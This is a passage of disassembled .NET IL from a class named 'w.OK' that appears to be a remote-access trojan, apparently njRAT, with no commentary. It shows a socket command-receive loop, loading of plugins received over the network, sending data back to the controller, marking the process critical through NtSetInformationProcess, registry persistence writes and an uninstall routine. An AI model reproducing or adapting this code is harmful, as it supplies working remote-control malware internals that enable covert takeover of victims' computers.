    IL_0053:  brfalse.s  IL_006a

    IL_0055:  ldloc.3
    IL_0056:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_005b:  ldloc.s    'type'
    IL_005d:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_0062:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0067:  stloc.1
    IL_0068:  br.s       IL_008e

    IL_006a:  nop
    IL_006b:  nop
    IL_006c:  ldloc.s    j
    IL_006e:  ldc.i4.1
    IL_006f:  add.ovf
    IL_0070:  stloc.s    j
    IL_0072:  ldloc.s    j
    IL_0074:  ldloc.s    VB$t_i4$L1
    IL_0076:  stloc.s    VB$CG$t_i4$S0
    IL_0078:  ldloc.s    VB$CG$t_i4$S0
    IL_007a:  ble.s      IL_0031

    IL_007c:  nop
    IL_007d:  ldloc.2
    IL_007e:  ldc.i4.1
    IL_007f:  add.ovf
    IL_0080:  stloc.2
    IL_0081:  ldloc.2
    IL_0082:  ldloc.s    VB$t_i4$L0
    IL_0084:  stloc.s    VB$CG$t_i4$S0
    IL_0086:  ldloc.s    VB$CG$t_i4$S0
    IL_0088:  ble.s      IL_0018

    IL_008a:  ldnull
    IL_008b:  stloc.1
    IL_008c:  br.s       IL_008e

    IL_008e:  ldloc.1
    IL_008f:  ret
  } // end of method OK::Plugin

  .method public static void  pr(int32 i) cil managed
  {
    // Code size       43 (0x2b)
    .maxstack  4
    .locals init ([0] class [mscorlib]System.Exception exception1)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0007:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000c:  ldc.i4.s   29
      IL_000e:  ldarga.s   i
      IL_0010:  ldc.i4.4
      IL_0011:  call       int32 w.OK::NtSetInformationProcess(native int,
                                                               int32,
                                                               int32&,
                                                               int32)
      IL_0016:  pop
      IL_0017:  leave.s    IL_0028

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0019:  dup
      IL_001a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001f:  stloc.0
      IL_0020:  nop
      IL_0021:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0026:  leave.s    IL_0028

    }  // end handler
    IL_0028:  nop
    IL_0029:  nop
    IL_002a:  ret
  } // end of method OK::pr

  .method public static void  RC() cil managed
  {
    // Code size       706 (0x2c2)
    .maxstack  8
    .locals init ([0] int64 num,
             [1] int32 num2,
             [2] int32 count,
             [3] int64 num5,
             [4] string str,
             [5] int32 charCode,
             [6] class [mscorlib]System.Threading.Thread thread,
             [7] class [mscorlib]System.Exception exception1,
             [8] class [mscorlib]System.Exception exception3,
             [9] int32 VB$t_i4$L0,
             [10] char VB$t_char$S0,
             [11] bool VB$CG$t_bool$S0,
             [12] bool VB$CG$t_bool$S1,
             [13] int32 VB$CG$t_i4$S0)
    IL_0000:  nop
    IL_0001:  nop
    IL_0002:  nop
    IL_0003:  ldstr      ""
    IL_0008:  stsfld     string w.OK::lastcap
    IL_000d:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
    IL_0012:  ldnull
    IL_0013:  ceq
    IL_0015:  ldc.i4.0
    IL_0016:  ceq
    IL_0018:  stloc.s    VB$CG$t_bool$S0
    IL_001a:  ldloc.s    VB$CG$t_bool$S0
    IL_001c:  brfalse    IL_024f

    IL_0021:  ldc.i4.m1
    IL_0022:  conv.i8
    IL_0023:  stloc.0
    IL_0024:  ldc.i4.0
    IL_0025:  stloc.1
    IL_0026:  nop
    .try
    {
      IL_0027:  nop
      IL_0028:  nop
      IL_0029:  ldloc.1
      IL_002a:  ldc.i4.1
      IL_002b:  add.ovf
      IL_002c:  stloc.1
      IL_002d:  ldloc.1
      IL_002e:  ldc.i4.s   10
      IL_0030:  ceq
      IL_0032:  stloc.s    VB$CG$t_bool$S0
      IL_0034:  ldloc.s    VB$CG$t_bool$S0
      IL_0036:  brfalse.s  IL_0041

      IL_0038:  ldc.i4.0
      IL_0039:  stloc.1
      IL_003a:  ldc.i4.1
      IL_003b:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_0040:  nop
      IL_0041:  nop
      IL_0042:  ldsfld     bool w.OK::Cn
      IL_0047:  ldc.i4.0
      IL_0048:  ceq
      IL_004a:  stloc.s    VB$CG$t_bool$S0
      IL_004c:  ldloc.s    VB$CG$t_bool$S0
      IL_004e:  brfalse.s  IL_0056

      IL_0050:  nop
      IL_0051:  leave      IL_0251

      IL_0056:  nop
      IL_0057:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
      IL_005c:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0061:  ldc.i4.1
      IL_0062:  clt
      IL_0064:  stloc.s    VB$CG$t_bool$S0
      IL_0066:  ldloc.s    VB$CG$t_bool$S0
      IL_0068:  brfalse.s  IL_007c

      IL_006a:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
      IL_006f:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_0074:  ldc.i4.m1
      IL_0075:  ldc.i4.0
      IL_0076:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_007b:  pop
      IL_007c:  nop
      IL_007d:  nop
      IL_007e:  nop
      IL_007f:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
      IL_0084:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0089:  ldc.i4.0
      IL_008a:  cgt
      IL_008c:  stloc.s    VB$CG$t_bool$S0
      IL_008e:  ldloc.s    VB$CG$t_bool$S0
      IL_0090:  brfalse    IL_023b

      IL_0095:  ldloc.0
      IL_0096:  ldc.i4.m1
      IL_0097:  conv.i8
      IL_0098:  ceq
      IL_009a:  stloc.s    VB$CG$t_bool$S1
      IL_009c:  ldloc.s    VB$CG$t_bool$S1
      IL_009e:  brfalse    IL_015b

      IL_00a3:  ldstr      ""
      IL_00a8:  stloc.s    str
      IL_00aa:  br         IL_0151

      IL_00af:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
      IL_00b4:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_00b9:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_00be:  stloc.s    charCode
      IL_00c0:  nop
      IL_00c1:  ldloc.s    charCode
      IL_00c3:  ldc.i4.m1
      IL_00c4:  sub
      IL_00c5:  stloc.s    VB$CG$t_i4$S0
      IL_00c7:  ldloc.s    VB$CG$t_i4$S0
      IL_00c9:  switch     ( 
                            IL_00d8,
                            IL_00e1)
      IL_00d6:  br.s       IL_012c

      IL_00d8:  nop
      IL_00d9:  nop
      IL_00da:  leave      IL_0251

      IL_00df:  br.s       IL_012c

      IL_00e1:  nop
      IL_00e2:  ldloc.s    str
      IL_00e4:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_00e9:  stloc.0
      IL_00ea:  ldstr      ""
      IL_00ef:  stloc.s    str
      IL_00f1:  ldloc.0
      IL_00f2:  ldc.i4.0
      IL_00f3:  conv.i8
      IL_00f4:  ceq
      IL_00f6:  stloc.s    VB$CG$t_bool$S1
      IL_00f8:  ldloc.s    VB$CG$t_bool$S1
      IL_00fa:  brfalse.s  IL_010a

      IL_00fc:  ldstr      ""
      IL_0101:  call       bool w.OK::Send(string)
      IL_0106:  pop
      IL_0107:  ldc.i4.m1
      IL_0108:  conv.i8
      IL_0109:  stloc.0
      IL_010a:  nop
      IL_010b:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
      IL_0110:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0115:  ldc.i4.0
      IL_0116:  cgt
      IL_0118:  ldc.i4.0
      IL_0119:  ceq
      IL_011b:  stloc.s    VB$CG$t_bool$S1
      IL_011d:  ldloc.s    VB$CG$t_bool$S1
      IL_011f:  brfalse.s  IL_0126

      IL_0121:  br         IL_0028

      IL_0126:  nop
      IL_0127:  br         IL_007e

      IL_012c:  nop
      IL_012d:  ldloc.s    str
      IL_012f:  ldloc.s    charCode
      IL_0131:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_0136:  stloc.s    VB$t_char$S0
      IL_0138:  ldloca.s   VB$t_char$S0
      IL_013a:  call       instance string [mscorlib]System.Char::ToString()
      IL_013f:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_0144:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_0149:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_014e:  stloc.s    str
      IL_0150:  nop
      IL_0151:  ldc.i4.1
      IL_0152:  stloc.s    VB$CG$t_bool$S1
      IL_0154:  ldloc.s    VB$CG$t_bool$S1
      IL_0156:  brtrue     IL_00af

      IL_015b:  nop
      IL_015c:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
      IL_0161:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0166:  ldc.i4.1
      IL_0167:  add.ovf
      IL_0168:  ldc.i4.1
      IL_0169:  sub.ovf
      IL_016a:  ldc.i4.1
      IL_016b:  add.ovf
      IL_016c:  newarr     [mscorlib]System.Byte
      IL_0171:  stsfld     uint8[] w.OK::b
      IL_0176:  ldloc.0
      IL_0177:  ldsfld     class [mscorlib]System.IO.MemoryStream w.OK::MeM
      IL_017c:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0181:  sub.ovf
      IL_0182:  stloc.3
      IL_0183:  ldsfld     uint8[] w.OK::b
      IL_0188:  ldlen
      IL_0189:  conv.ovf.i4
      IL_018a:  conv.i8
      IL_018b:  ldloc.3
      IL_018c:  cgt
      IL_018e:  stloc.s    VB$CG$t_bool$S1
      IL_0190:  ldloc.s    VB$CG$t_bool$S1
      IL_0192:  brfalse.s  IL_01a9

      IL_0194:  ldloc.3
      IL_0195:  ldc.i4.1
      IL_0196:  conv.i8
      IL_0197:  sub.ovf
      IL_0198:  conv.ovf.i4
      IL_0199:  ldc.i4.1
      IL_019a:  add.ovf
      IL_019b:  ldc.i4.1
      IL_019c:  sub.ovf
      IL_019d:  ldc.i4.1
      IL_019e:  add.ovf
      IL_019f:  newarr     [mscorlib]System.Byte
      IL_01a4:  stsfld     uint8[] w.OK::b
      IL_01a9:  nop
      IL_01aa:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
      IL_01af:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_01b4:  ldsfld     uint8[] w.OK::b
      IL_01b9:  ldc.i4.0
      IL_01ba:  ldsfld     uint8[] w.OK::b
      IL_01bf:  ldlen
      IL_01c0:  conv.ovf.i4
      IL_01c1:  ldc.i4.0
      IL_01c2:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_01c7:  stloc.2
      IL_01c8:  ldsfld     class [mscorlib]System.IO.MemoryStream w.OK::MeM
      IL_01cd:  ldsfld     uint8[] w.OK::b
      IL_01d2:  ldc.i4.0
      IL_01d3:  ldloc.2
      IL_01d4:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_01d9:  nop
      IL_01da:  ldsfld     class [mscorlib]System.IO.MemoryStream w.OK::MeM
      IL_01df:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_01e4:  ldloc.0
      IL_01e5:  ceq
      IL_01e7:  stloc.s    VB$CG$t_bool$S1
      IL_01e9:  ldloc.s    VB$CG$t_bool$S1
      IL_01eb:  brfalse.s  IL_0235

      IL_01ed:  ldc.i4.m1
      IL_01ee:  conv.i8
      IL_01ef:  stloc.0
      IL_01f0:  ldnull
      IL_01f1:  ldftn      void w.OK::im(object)
      IL_01f7:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_01fc:  ldc.i4.1
      IL_01fd:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_0202:  stloc.s    thread
      IL_0204:  ldloc.s    thread
      IL_0206:  ldsfld     class [mscorlib]System.IO.MemoryStream w.OK::MeM
      IL_020b:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_0210:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0215:  nop
      IL_0216:  ldloc.s    thread
      IL_0218:  ldc.i4.s   100
      IL_021a:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_021f:  pop
      IL_0220:  ldsfld     class [mscorlib]System.IO.MemoryStream w.OK::MeM
      IL_0225:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_022a:  nop
      IL_022b:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_0230:  stsfld     class [mscorlib]System.IO.MemoryStream w.OK::MeM
      IL_0235:  nop
      IL_0236:  br         IL_0028

      IL_023b:  nop
      IL_023c:  leave.s    IL_024e

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_023e:  dup
      IL_023f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0244:  stloc.s    exception1
      IL_0246:  nop
      IL_0247:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_024c:  leave.s    IL_024e

    }  // end handler
    IL_024e:  nop
    IL_024f:  nop
    IL_0250:  nop
    IL_0251:  nop
    IL_0252:  nop
    .try
    {
      IL_0253:  ldsfld     object w.OK::PLG
      IL_0258:  ldnull
      IL_0259:  ceq
      IL_025b:  ldc.i4.0
      IL_025c:  ceq
      IL_025e:  stloc.s    VB$CG$t_bool$S1
      IL_0260:  ldloc.s    VB$CG$t_bool$S1
      IL_0262:  brfalse.s  IL_028a

      IL_0264:  ldsfld     object w.OK::PLG
      IL_0269:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_026e:  ldnull
      IL_026f:  ldstr      "clear"
      IL_0274:  ldc.i4.0
      IL_0275:  newarr     [mscorlib]System.Object
      IL_027a:  ldnull
      IL_027b:  ldnull
      IL_027c:  ldnull
      IL_027d:  ldc.i4.1
      IL_027e:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_0283:  pop
      IL_0284:  ldnull
      IL_0285:  stsfld     object w.OK::PLG
      IL_028a:  nop
      IL_028b:  leave.s    IL_029d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_028d:  dup
      IL_028e:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0293:  stloc.s    exception3
      IL_0295:  nop
      IL_0296:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_029b:  leave.s    IL_029d

    }  // end handler
    IL_029d:  nop
    IL_029e:  ldc.i4.0
    IL_029f:  stsfld     bool w.OK::Cn
    IL_02a4:  call       bool w.OK::connect()
    IL_02a9:  ldc.i4.0
    IL_02aa:  ceq
    IL_02ac:  stloc.s    VB$CG$t_bool$S1
    IL_02ae:  ldloc.s    VB$CG$t_bool$S1
    IL_02b0:  brfalse.s  IL_02b4

    IL_02b2:  br.s       IL_0251

    IL_02b4:  nop
    IL_02b5:  ldc.i4.1
    IL_02b6:  stsfld     bool w.OK::Cn
    IL_02bb:  br         IL_0002

    IL_02c0:  nop
    IL_02c1:  ret
  } // end of method OK::RC

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  2
    .locals init ([0] uint8[] SB)
    IL_0000:  nop
    IL_0001:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0006:  ldarg.0
    IL_0007:  ldind.ref
    IL_0008:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::SB

  .method public static bool  Send(string S) cil managed
  {
    // Code size       18 (0x12)
    .maxstack  1
    .locals init ([0] bool Send)
    IL_0000:  nop
    IL_0001:  ldarga.s   S
    IL_0003:  call       uint8[] w.OK::SB(string&)
    IL_0008:  call       bool w.OK::Sendb(uint8[])
    IL_000d:  stloc.0
    IL_000e:  br.s       IL_0010

    IL_0010:  ldloc.0
    IL_0011:  ret
  } // end of method OK::Send

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       264 (0x108)
    .maxstack  5
    .locals init ([0] bool Sendb,
             [1] class [mscorlib]System.IO.FileInfo lO,
             [2] uint8[] buffer,
             [3] int32 length,
             [4] class [mscorlib]System.IO.MemoryStream 'stream',
             [5] class [mscorlib]System.Exception exception,
             [6] class [mscorlib]System.Exception exception1,
             [7] class [mscorlib]System.Exception exception3,
             [8] class [mscorlib]System.IO.FileInfo VB$t_ref$L0,
             [9] string VB$t_string$S0,
             [10] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  ldsfld     bool w.OK::Cn
    IL_0006:  ldc.i4.0
    IL_0007:  ceq
    IL_0009:  stloc.s    VB$CG$t_bool$S0
    IL_000b:  ldloc.s    VB$CG$t_bool$S0
    IL_000d:  brfalse.s  IL_0016

    IL_000f:  ldc.i4.0
    IL_0010:  stloc.0
    IL_0011:  br         IL_0106

    IL_0016:  nop
    IL_0017:  nop
    .try
    {
      IL_0018:  ldsfld     class [mscorlib]System.IO.FileInfo w.OK::LO
      IL_001d:  stloc.1
      IL_001e:  nop
      IL_001f:  ldloc.1
      IL_0020:  stloc.s    VB$t_ref$L0
      IL_0022:  ldloc.s    VB$t_ref$L0
      IL_0024:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      IL_0029:  nop
      IL_002a:  nop
      .try
      {
        IL_002b:  ldsfld     bool w.OK::Cn
        IL_0030:  ldc.i4.0
        IL_0031:  ceq
        IL_0033:  stloc.s    VB$CG$t_bool$S0
        IL_0035:  ldloc.s    VB$CG$t_bool$S0
        IL_0037:  brfalse.s  IL_0040

        IL_0039:  ldc.i4.0
        IL_003a:  stloc.0
        IL_003b:  leave      IL_0106

        IL_0040:  nop
        IL_0041:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_0046:  stloc.s    'stream'
        IL_0048:  ldarg.0
        IL_0049:  ldlen
        IL_004a:  conv.ovf.i4
        IL_004b:  stloc.3
        IL_004c:  ldloca.s   length
        IL_004e:  call       instance string [mscorlib]System.Int32::ToString()
        IL_0053:  ldstr      bytearray (00 00 ) 
        IL_0058:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_005d:  stloc.s    VB$t_string$S0
        IL_005f:  ldloca.s   VB$t_string$S0
        IL_0061:  call       uint8[] w.OK::SB(string&)
        IL_0066:  stloc.2
        IL_0067:  ldloc.s    'stream'
        IL_0069:  ldloc.2
        IL_006a:  ldc.i4.0
        IL_006b:  ldloc.2
        IL_006c:  ldlen
        IL_006d:  conv.ovf.i4
        IL_006e:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0073:  nop
        IL_0074:  ldloc.s    'stream'
        IL_0076:  ldarg.0
        IL_0077:  ldc.i4.0
        IL_0078:  ldarg.0
        IL_0079:  ldlen
        IL_007a:  conv.ovf.i4
        IL_007b:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0080:  nop
        IL_0081:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
        IL_0086:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_008b:  ldloc.s    'stream'
        IL_008d:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0092:  ldc.i4.0
        IL_0093:  ldloc.s    'stream'
        IL_0095:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_009a:  conv.ovf.i4
        IL_009b:  ldc.i4.0
        IL_009c:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_00a1:  pop
        IL_00a2:  nop
        IL_00a3:  leave.s    IL_00ae

      }  // end .try
      finally
      {
        IL_00a5:  ldloc.s    VB$t_ref$L0
        IL_00a7:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_00ac:  nop
        IL_00ad:  endfinally
      }  // end handler
      IL_00ae:  leave.s    IL_00fd

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_00b0:  dup
      IL_00b1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00b6:  stloc.s    exception1
      IL_00b8:  nop
      IL_00b9:  ldloc.s    exception1
      IL_00bb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_00c0:  nop
      IL_00c1:  ldloc.s    exception1
      IL_00c3:  stloc.s    exception
      IL_00c5:  nop
      .try
      {
        IL_00c6:  ldsfld     bool w.OK::Cn
        IL_00cb:  stloc.s    VB$CG$t_bool$S0
        IL_00cd:  ldloc.s    VB$CG$t_bool$S0
        IL_00cf:  brfalse.s  IL_00e2

        IL_00d1:  ldc.i4.0
        IL_00d2:  stsfld     bool w.OK::Cn
        IL_00d7:  ldsfld     class [System]System.Net.Sockets.TcpClient w.OK::C
        IL_00dc:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00e1:  nop
        IL_00e2:  nop
        IL_00e3:  leave.s    IL_00f5

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00e5:  dup
        IL_00e6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00eb:  stloc.s    exception3
        IL_00ed:  nop
        IL_00ee:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00f3:  leave.s    IL_00f5

      }  // end handler
      IL_00f5:  nop
      IL_00f6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00fb:  leave.s    IL_00fd

    }  // end handler
    IL_00fd:  nop
    IL_00fe:  ldsfld     bool w.OK::Cn
    IL_0103:  stloc.0
    IL_0104:  br.s       IL_0106

    IL_0106:  ldloc.0
    IL_0107:  ret
  } // end of method OK::Sendb

  .method public static bool  STV(string n,
                                  object t,
                                  valuetype [mscorlib]Microsoft.Win32.RegistryValueKind typ) cil managed
  {
    // Code size       98 (0x62)
    .maxstack  4
    .locals init ([0] bool STV,
             [1] class [mscorlib]System.Exception exception1)
    IL_0000:  nop
    IL_0001:  nop
    .try
    {
      IL_0002:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
      IL_0007:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0011:  ldstr      "Software\\"
      IL_0016:  ldsfld     string w.OK::RG
      IL_001b:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_0020:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0025:  ldarg.0
      IL_0026:  ldarg.1
      IL_0027:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002c:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0031:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_0036:  ldarg.2
      IL_0037:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_003c:  nop
      IL_003d:  ldc.i4.1
      IL_003e:  stloc.0
      IL_003f:  leave.s    IL_0060

      IL_0041:  leave.s    IL_005b

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0043:  dup
      IL_0044:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0049:  stloc.1
      IL_004a:  nop
      IL_004b:  ldc.i4.0
      IL_004c:  stloc.0
      IL_004d:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0052:  leave.s    IL_0060

      IL_0054:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0059:  leave.s    IL_005b

    }  // end handler
    IL_005b:  nop
    IL_005c:  ldc.i4.0
    IL_005d:  stloc.0
    IL_005e:  br.s       IL_0060

    IL_0060:  ldloc.0
    IL_0061:  ret
  } // end of method OK::STV

  .method public static void  UNS() cil managed noinlining
  {
    // Code size       449 (0x1c1)
    .maxstack  4
    .locals init ([0] class [mscorlib]System.Exception ex,
             [1] class [mscorlib]System.Exception V_1,
             [2] class [mscorlib]System.Exception V_2,
             [3] class [mscorlib]System.Exception V_3,
             [4] class [mscorlib]System.Exception V_4,
             [5] class [mscorlib]System.Exception V_5,
             [6] class [mscorlib]System.Exception V_6,
             [7] bool VB$CG$t_bool$S0)
    IL_0000:  nop
    IL_0001:  ldc.i4.0
    IL_0002:  call       void w.OK::pr(int32)
    IL_0007:  nop
    IL_0008:  ldc.i4.0
    IL_0009:  stsfld     bool w.OK::Isu
    IL_000e:  nop
    .try
    {
      IL_000f:  call       string [System.Windows.Forms]System.Windows.Forms.Application::get_ExecutablePath()
      IL_0014:  ldc.i4     0x80
      IL_0019:  call       void [mscorlib]System.IO.File::SetAttributes(string,
                                                                        valuetype [mscorlib]System.IO.FileAttributes)
      IL_001e:  nop
      IL_001f:  leave.s    IL_0030

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0021:  dup
      IL_0022:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0027:  stloc.0
      IL_0028:  nop
      IL_0029:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002e:  leave.s    IL_0030

    }  // end handler
    IL_0030:  nop
    IL_0031:  nop
    .try
    {
      IL_0032:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
      IL_0037:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_003c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_0041:  ldsfld     string w.OK::sf
      IL_0046:  ldc.i4.1
      IL_0047:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                  bool)
      IL_004c:  ldsfld     string w.OK::RG
      IL_0051:  ldc.i4.0
      IL_0052:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::DeleteValue(string,
                                                                                            bool)
      IL_0057:  nop
      IL_0058:  leave.s    IL_0069

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_005a:  dup
      IL_005b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0060:  stloc.1
      IL_0061:  nop
      IL_0062:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0067:  leave.s    IL_0069

    }  // end handler
    IL_0069:  nop
    IL_006a:  nop
    .try
    {
      IL_006b:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer w.OK::F
